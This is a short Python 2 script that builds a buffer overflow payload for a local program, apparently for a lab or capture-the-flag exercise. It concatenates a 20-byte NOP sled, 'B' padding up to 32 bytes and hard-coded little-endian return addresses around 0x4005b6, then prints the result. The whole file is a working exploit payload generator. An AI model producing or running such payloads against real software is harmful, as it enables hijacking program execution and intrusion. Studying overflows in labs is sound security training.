#!\usr\bin\python


## Total payload length
payload_length = 32
## Amount of nops
nop_length = 20
## Controlled memory address to return to in Little Endian format (two addresses next to each other)
return_address = '\xb6\x05\x40\x00\x00\x00\x00\x00\xb7\x05\x40\x00\x00\x00\x00\x00\x00'
## Building the nop slide
nop_slide = "\x90" * nop_length
## Building the padding between buffer overflow start and return address
padding = 'B' * (payload_length - nop_length)
myPayload = nop_slide + padding + return_address
print myPayload
